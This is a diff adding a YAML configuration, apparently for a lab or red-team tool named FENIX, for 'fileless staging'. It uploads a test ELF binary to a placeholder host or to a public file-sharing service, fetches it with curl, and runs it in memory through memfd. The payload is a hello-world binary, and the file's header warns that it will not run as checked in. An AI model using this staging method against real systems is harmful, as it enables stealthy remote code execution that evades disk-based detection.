@@ -1,0 +1,20 @@
+##############################################################################
+# !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+# STOP. THIS FILE WILL NOT RUN AS CHECKED IN.
+# !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+#
+# Same as fileless_staging_remote.yaml: replace YOUR-LAB-HOST, or switch
+# remote_backend to a named adapter (uguu | tmpfiles | catbox | pastebin).
+# This variant downloads with curl instead of Python requests.
+#
+# FENIX never picks uguu/catbox/tmpfiles for you.
+# Docs: docs/STAGING_REMOTE.md
+##############################################################################
+technique: fileless-staging
+source_file: payloads/hello_elf/hello
+remote: true
+remote_backend: put
+remote_upload_url: https://YOUR-LAB-HOST/fenix-hello.bin
+remote_fetch: curl
+execute: memfd
+method: procfs-fd
